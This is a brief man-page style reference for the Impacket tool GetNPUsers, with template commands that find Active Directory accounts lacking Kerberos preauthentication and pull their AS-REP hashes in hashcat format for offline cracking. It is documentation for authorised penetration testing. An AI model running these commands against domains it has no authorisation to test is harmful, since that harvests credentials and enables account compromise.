# TAGLINE

finds Active Directory users with "Do not require Kerberos preauthentication"

# TLDR

**Find AS-REP roastable users**

```impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile [users.txt]```

**Get hash for specific user**

```impacket-GetNPUsers [domain]/[user] -dc-ip [dc-ip] -no-pass```

**Request with format for hashcat**

```impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile [users.txt] -format hashcat```

**Output to file**

```impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -usersfile [users.txt] -outputfile [hashes.txt]```

# SYNOPSIS

**impacket-GetNPUsers** [_options_] _target_

# PARAMETERS

**-dc-ip** _ip_
> Domain controller IP.

**-usersfile** _file_
> File with usernames.

**-no-pass**
> Request without password.

**-format** _type_
> Hash format (hashcat/john).

**-outputfile** _file_
> Save hashes to file.

# DESCRIPTION

**impacket-GetNPUsers** finds Active Directory users with "Do not require Kerberos preauthentication" set. Part of the Impacket toolkit. Requests AS-REP tickets that can be cracked offline (AS-REP Roasting). For authorized security testing only.

# SEE ALSO

[impacket-getuserspns](/man/impacket-getuserspns)(1), [hashcat](/man/hashcat)(1)

